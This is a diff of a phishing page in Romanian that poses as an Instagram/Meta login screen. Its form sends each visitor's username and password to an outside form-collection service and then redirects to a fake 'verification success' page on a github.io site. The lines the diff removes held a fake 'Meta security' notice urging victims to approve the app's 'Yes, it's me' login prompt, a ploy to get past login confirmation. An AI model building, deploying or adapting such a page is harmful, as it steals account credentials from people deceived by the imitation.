@@ -6,41 +6,23 @@
     <title>Log In</title>
     <style>
         body { background: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { width: 310px; text-align: center; border: 1px solid #dbdbdb; padding: 40px 20px; border-radius: 3px; background: white; box-sizing: border-box; }
+        .box { width: 310px; text-align: center; border: 1px solid #dbdbdb; padding: 40px 20px; border-radius: 3px; }
         .logo-img { width: 175px; margin-bottom: 35px; }
-        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 13px; box-sizing: border-box; outline: none; }
+        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 13px; box-sizing: border-box; outline: none; }
         button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 14px; }
-        
-        /* Textul pentru confirmarea in aplicatie */
-        .notice-container { background: #fdfdfd; border: 1px dashed #0095f6; padding: 10px; border-radius: 5px; margin: 20px 0 10px; text-align: left; }
-        .notice-text { font-size: 12px; color: #262626; line-height: 1.4; }
-        .notice-text b { color: #0095f6; }
-
-        .footer { position: absolute; bottom: 20px; font-size: 11px; color: #c7c7c7; text-transform: uppercase; letter-spacing: 1px; }
+        .footer { position: absolute; bottom: 20px; font-size: 11px; color: #c7c7c7; text-transform: uppercase; }
     </style>
 </head>
 <body>
-
     <div class="box">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/Instagram-logo-svg-vector-free-download.png" class="logo-img">
-        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img">
         <form action="https://formspree.io/f/xzdkrgdq" method="POST">
-            <input type="text" name="ID_Utilizator" placeholder="Telefon, utilizator sau e-mail" required>
+            <input type="text" name="ID_Utilizator" placeholder="Număr de telefon, utilizator sau e-mail" required>
             <input type="password" name="Cheie_Acces" placeholder="Parolă" required>
-            
-            <div class="notice-container">
-                <div class="notice-text">
-                    🛡️ <b>Securitate Meta:</b> După ce apeși pe Log In, deschide aplicația de pe telefonul tău și apasă pe notificarea <b>"Da, eu sunt"</b> pentru a confirma identitatea.
-                </div>
-            </div>
-
             <button type="submit">Log in</button>
-            
             <input type="hidden" name="_next" value="https://ryt6ngx4tm-crypto.github.io/mata/verificare/succes.html">
         </form>
     </div>
-
     <div class="footer">from META</div>
-
 </body>
 </html>
